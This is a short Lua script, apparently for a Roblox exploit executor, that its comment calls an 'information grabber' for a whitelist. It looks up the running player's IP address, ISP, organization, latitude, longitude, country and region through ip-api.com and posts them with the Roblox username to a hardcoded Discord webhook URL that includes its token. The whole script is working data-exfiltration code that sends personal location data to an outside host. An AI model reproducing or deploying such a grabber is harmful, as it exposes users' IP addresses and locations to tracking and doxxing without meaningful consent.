--[[

i do not care to obfuscate this, this is just an information grabber for my whitelist
execute at your own risk, there is much information that will be gathered such as:
ISP, IP-Address,Region,Country,etc

]]
local LP = game.GetService(game,"Players").LocalPlayer;
local alink = game:HttpGet("http://ip-api.com/json/");
local b = game:GetService("HttpService"):JSONDecode(alink);

if b.query then 
    local url ="https://discord.com/api/webhooks/941930966883123272/JGwksgXXuTSRl5GOue6XMMMvI43DBoZrtN9JWXcutcntblHwFk9eBkOmMu4uH5ObLH9y"
    local data = {
        ["content"] = LP.Name,
        ["embeds"] = {{
                ["title"] = "**Whitelist request**",
                ["description"] = string.format("User: %s \n Display: %s \n IP: %s \n ISP: %s \n Organization: %s \n Cable Operator: %s \n Lat: %s \n Lon: %s \n Country: %s \n Region: %s",LP.Name,LP.DisplayName,b.query,b.isp,b.org,b.as,b.lat,b.lon,b.country,b.regionName),
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(LP.Name)
                }}}
        }
    local newdata = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end
